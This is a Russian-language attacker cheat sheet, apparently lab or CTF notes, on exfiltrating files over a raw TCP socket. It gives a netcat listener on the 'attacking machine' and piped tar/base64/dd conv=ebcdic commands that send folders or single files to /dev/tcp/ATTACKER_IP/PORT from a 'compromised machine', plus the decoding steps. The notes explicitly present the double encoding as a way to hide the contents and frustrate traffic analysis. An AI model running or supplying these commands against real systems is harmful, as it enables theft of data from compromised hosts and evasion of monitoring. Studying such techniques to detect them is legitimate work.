# EXFILTRATION ЧЕРЕЗ TCP SOCKET + КОДИРОВАНИЕ

## Суть

Передача данных через TCP сокет с использованием кодирования (Base64 + EBCDIC) для маскировки содержимого.

## Когда использовать

- В небезопасной среде, где нет сетевых средств защиты
- Когда нужно быстро вытащить данные
- Не подходит для сред с DLP/NGFW (легко детектится)


# ШАГ 1: ПОДГОТОВКА СЛУШАТЕЛЯ (на атакующей машине)

nc -lvp 8080 > /tmp/data.received

-l — слушать
-v — verbose
-p — порт
> — сохранить полученные данные в файл


# ШАГ 2: ОТПРАВКА ДАННЫХ (на скомпрометированной машине)

tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/IP_ATTACKER/8080

## Разбор команды:

tar zcf - task4/
  - z — сжать gzip
  - c — создать архив
  - f - — вывести в stdout (вместо файла)
  - task4/ — папка для архивации

base64 — преобразовать в Base64 (текстовое представление)

dd conv=ebcdic — преобразовать в EBCDIC кодировку (нечитаемый вид)

> /dev/tcp/IP/PORT — отправить через TCP сокет


# ШАГ 3: ВОССТАНОВЛЕНИЕ ДАННЫХ (на атакующей машине)

dd conv=ascii if=data.received | base64 -d > data.tar
tar xvf data.tar

## Разбор:

dd conv=ascii if=data.received — преобразовать из EBCDIC в ASCII
base64 -d — декодировать Base64
tar xvf — распаковать архив


# КЛЮЧЕВОЙ МОМЕНТ

Двойное кодирование (Base64 + EBCDIC):
- Делает данные нечитаемыми при перехвате
- Скрывает тип передаваемых файлов
- Затрудняет анализ трафика


# БЫСТРАЯ ШПАРГАЛКА

# Отправить папку через TCP
tar zcf - /path/to/folder | base64 | dd conv=ebcdic > /dev/tcp/ATTACKER_IP/PORT

# Восстановить
dd conv=ascii if=received.data | base64 -d > archive.tar
tar xvf archive.tar

# Отправить один файл (без архивации)
cat file | base64 | dd conv=ebcdic > /dev/tcp/ATTACKER_IP/PORT

# Восстановить файл
dd conv=ascii if=received.data | base64 -d > file
```
